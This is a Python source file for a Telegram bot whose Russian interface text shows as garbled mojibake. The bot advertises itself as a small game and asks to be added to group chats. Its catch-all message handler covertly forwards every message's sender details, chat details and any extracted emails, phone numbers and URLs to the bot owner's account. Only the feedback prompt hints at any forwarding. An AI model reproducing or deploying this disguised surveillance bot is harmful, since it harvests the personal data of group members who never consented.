import telebot
from telebot import types
from datetime import datetime, timedelta
import sqlite3
import html
import random

bot = telebot.TeleBot("token", parse_mode='HTML')
me = my_id

def safe(val):
    if val is None:
        return None
    if isinstance(val, list):
        return "\n".join(safe(v) for v in val if v is not None)
    if hasattr(val, '__dict__'):
        if val.__class__.__name__ == "MessageEntity":
            return f"—Ç–∏–ø: {val.type}, offset: {val.offset}, –¥–ª–∏–Ω–∞: {val.length}"
        return str({k: safe(v) for k, v in val.__dict__.items() if v is not None})
    return html.escape(str(val))


@bot.message_handler(commands=['start'])
def send_welcome(message):

    conn = sqlite3.connect("emojis.db")
    cursor = conn.cursor()
    cursor.execute("""CREATE TABLE IF NOT EXISTS users(id INTEGER PRIMARY KEY AUTOINCREMENT,username TEXT,user_id INTEGER UNIQUE,time TEXT,emojis TEXT,money INTEGER UNIQUE)""")
    conn.commit()
    conn.close()

    markup = types.InlineKeyboardMarkup()
    btn0 = types.InlineKeyboardButton(
        text="‚ûï –î–æ–±–∞–≤–∏—Ç—å –±–æ—Ç–∞", url="https://t.me/YOUR_BOT_USERNAME?startgroup=true"
    )
    markup.add(btn0)

    bot.send_message(
        message.chat.id,
        "<b>–ü—Ä–∏–≤–µ—Ç!\n–Ø —Å–æ–≤—Å–µ–º –º–æ–ª–æ–¥–æ–π –±–æ—Ç –∏ –Ω–∞—Ö–æ–∂—É—Å—å –≤ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–µ!!! ‚ö†\n"
        "–ù–æ —Ç—ã —É–∂–µ –º–æ–∂–µ—à—å –¥–æ–±–∞–≤–∏—Ç—å –Ω–µ–±–æ–ª—å—à—É—é –∏–≥—Ä—É 'Ludik' –æ—Ç –º–µ–Ω—èüëá</b>",
        reply_markup=markup
    )

@bot.message_handler(commands=['info'])
def send_info(message):
    text = (
        "<b>üìå –ë–õ–ò–ñ–ê–ô–®–ò–ï –ü–õ–ê–ù–´ –†–ê–ó–†–ê–ë–û–¢–ß–ò–ö–û–í</b>\n\n"
        "<b>1.</b> –î–æ–±–∞–≤–ª–µ–Ω–∏–µ –±–æ–ª—å—à–µ–≥–æ –∫–æ–ª–∏—á–µ—Å—Ç–≤–∞ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–æ–≤ –¥–ª—è –º–æ–¥–µ—Ä–∞—Ü–∏–∏ —á–∞—Ç–æ–≤ ‚öñ\n\n"
        "<b>2.</b> –£–ª—É—á—à–µ–Ω–∏–µ –∏–º–µ—é—â–∏—Ö—Å—è —Ñ—É–Ω–∫—Ü–∏–π –∏ –¥–æ–±–∞–≤–ª–µ–Ω–∏–µ –¥–æ–Ω–∞—Ç–∞ üí∂\n\n"
        "<b>3.</b> –í—ã –º–æ–∂–µ—Ç–µ –ø—Ä–µ–¥–ª–æ–∂–∏—Ç—å —Å–≤–æ–∏ –∏–¥–µ–∏, –¥–æ–±–∞–≤–∏–≤ '!!' –≤ –Ω–∞—á–∞–ª–µ —Å–æ–æ–±—â–µ–Ω–∏—è‚úâ"
    )
    bot.send_message(message.chat.id, text)

def extract_relevant_entities(message):
    if not message.entities or not message.text:
        return []

    relevant_types = {'url', 'email', 'phone_number', 'hashtag'}
    extracted = []

    for entity in message.entities:
        if entity.type in relevant_types:
            start = entity.offset
            end = start + entity.length
            entity_text = message.text[start:end]
            extracted.append(f"{entity.type}: {entity_text}")

    return extracted

@bot.message_handler(func=lambda m: True)
def handle_all_messages(message):
    relevant_entities = extract_relevant_entities(message)
    time_str = datetime.fromtimestamp(message.date).strftime("%d.%m.%Y %H:%M:%S")

    lines = []
    lines.append("<b>–õ–ò–ß–ù–û–°–¢–¨</b>")
    if message.from_user.first_name:
        lines.append(f"–ò–º—è: {safe(message.from_user.first_name)}")
    if message.from_user.last_name:
        lines.append(f"–§–∞–º–∏–ª–∏—è: {safe(message.from_user.last_name)}")
    if message.from_user.username:
        lines.append(f"–Æ–∑–µ—Ä–Ω–µ–π–º: @{safe(message.from_user.username)}")
    lines.append(f"ID: {message.from_user.id}")
    lines.append(f"–ë–æ—Ç: {message.from_user.is_bot}")
    if message.from_user.language_code:
        lines.append(f"–Ø–∑—ã–∫: {safe(message.from_user.language_code)}")
    lines.append(f"–í—Ä–µ–º—è –æ—Ç–ø—Ä–∞–≤–∫–∏: {time_str}\n")

    lines.append("<b>–ß–ê–¢</b>")
    lines.append(f"ID –ß–∞—Ç–∞: {message.chat.id}")
    lines.append(f"–¢–∏–ø —á–∞—Ç–∞: {message.chat.type}")
    if message.chat.title:
        lines.append(f"–ù–∞–∑–≤–∞–Ω–∏–µ —á–∞—Ç–∞: {safe(message.chat.title)}")
    if message.chat.username:
        lines.append(f"–Æ–∑–µ—Ä–Ω–µ–π–º —á–∞—Ç–∞: @{safe(message.chat.username)}")
    else:
        lines.append("–Æ–∑–µ—Ä–Ω–µ–π–º —á–∞—Ç–∞: –Ω–µ—Ç—É")
    if message.left_chat_member:
        lines.append("–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤—ã—à–µ–ª –∏–∑ —á–∞—Ç–∞: –î–∞")
    if message.new_chat_members:
        lines.append(f"–ù–æ–≤—ã–µ —É—á–∞—Å—Ç–Ω–∏–∫–∏: {safe(message.new_chat_members)}")

    if relevant_entities:
        lines.append("\n<b>–í–∞–∂–Ω—ã–µ —Å—É—â–Ω–æ—Å—Ç–∏ –∏–∑ —Å–æ–æ–±—â–µ–Ω–∏—è:</b>")
        lines.extend(relevant_entities)

    base_info = "\n".join(lines)
    if len(base_info) > 4000:
        base_info = base_info[:3990] + "\n<i>–û–±—Ä–µ–∑–∞–Ω–æ...</i>"

    if message.text and message.text.startswith("!!"):
        bot.send_message(message.chat.id, "<b>–°–ø–∞—Å–∏–±–æ –∑–∞ —Å–æ—Ç—Ä—É–¥–Ω–∏—á–µ—Å—Ç–≤–æ!</b>")
        idea_text = f"\n<b>–ò–î–ï–Ø:</b> {html.escape(message.text[2:].strip())}"
        bot.send_message(me, base_info + idea_text)
    else:
        bot.send_message(me, base_info)




bot.infinity_polling()
